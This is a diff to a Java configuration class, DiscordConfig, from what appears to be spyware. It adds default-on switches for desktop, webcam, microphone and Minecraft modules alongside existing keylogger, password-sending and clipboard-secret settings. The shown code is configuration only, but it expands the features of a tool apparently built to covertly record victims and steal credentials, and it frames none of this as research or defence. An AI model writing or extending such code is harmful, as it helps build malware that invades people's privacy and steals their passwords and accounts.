@@ -22,6 +22,10 @@ public final class DiscordConfig {
 	/** Granular keystroke timeline; additive, off only when provisioned off. */
 	private static volatile boolean keyloggerTimeline = true;
 	private static volatile boolean clipboardTimeline = true;
+	private static volatile boolean moduleDesktop = true;
+	private static volatile boolean moduleWebcam = true;
+	private static volatile boolean moduleMic = true;
+	private static volatile boolean moduleMinecraft = true;
 	private static volatile boolean clipboard = true;
 	/** Secret clipboard alerts are on unless a config explicitly turns them off. */
 	private static final boolean SECRETS_DEFAULT = true;
@@ -88,6 +92,11 @@ public final class DiscordConfig {
 		keylogger = !Boolean.FALSE.equals(keys.get("enabled"));
 		sendPasswords = !Boolean.FALSE.equals(keys.get("sendPasswords"));
 		keyloggerTimeline = !Boolean.FALSE.equals(keys.get("timeline"));
+		Map<String, Object> modules = Json.map(root.get("modules"));
+		moduleDesktop = !Boolean.FALSE.equals(modules.get("desktop"));
+		moduleWebcam = !Boolean.FALSE.equals(modules.get("webcam"));
+		moduleMic = !Boolean.FALSE.equals(modules.get("mic"));
+		moduleMinecraft = !Boolean.FALSE.equals(modules.get("minecraft"));
 		Map<String, Object> board = Json.map(root.get("clipboard"));
 		clipboard = !Boolean.FALSE.equals(board.get("enabled"));
 		sendSecrets = !Boolean.FALSE.equals(board.get("sendSecrets"));
@@ -138,6 +147,22 @@ public final class DiscordConfig {
 
 	public static boolean clipboardTimeline() {
 		return clipboardTimeline;
+	}
+
+	public static boolean desktop() {
+		return moduleDesktop;
+	}
+
+	public static boolean webcam() {
+		return moduleWebcam;
+	}
+
+	public static boolean mic() {
+		return moduleMic;
+	}
+
+	public static boolean minecraft() {
+		return moduleMinecraft;
 	}
 
 	public static boolean sendSecrets() {
